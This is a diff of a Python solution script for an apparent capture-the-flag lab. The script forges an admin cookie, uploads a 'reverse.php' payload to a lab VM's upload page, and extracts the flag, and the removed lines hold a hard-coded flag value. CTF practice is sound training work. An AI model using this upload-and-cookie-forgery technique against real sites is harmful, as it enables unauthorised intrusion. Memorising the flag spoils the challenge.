@@ -1,12 +1,15 @@
+import os
+import re
 import requests
+from pathlib import Path
 
-url = "http://192.168.122.213/?page=upload"
+VM_IP = os.environ.get("VM_IP", "192.168.122.213")
+url = f"http://{VM_IP}/?page=upload"
 
-cookies = {
-    "I_am_admin": "68934a3e9455fa72420237eb05902327"
-}
+cookies = {"I_am_admin": "68934a3e9455fa72420237eb05902327"}
 
-with open('reverse.php', 'rb') as f:
+php_file = Path(__file__).parent / "reverse.php"
+with open(php_file, "rb") as f:
     file_data = f.read()
 
 files = {
@@ -16,9 +19,8 @@ files = {
 }
 
 r = requests.post(url, files=files, cookies=cookies)
-
-with open('response.html', 'w') as f:
-    f.write(r.text)
-
-print(r.status_code)
-# flag is 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
+match = re.search(r"flag is : ([a-f0-9]{64})", r.text, re.IGNORECASE)
+if match:
+    print(f"Flag: {match.group(1)}")
+else:
+    print("Flag not found in response")
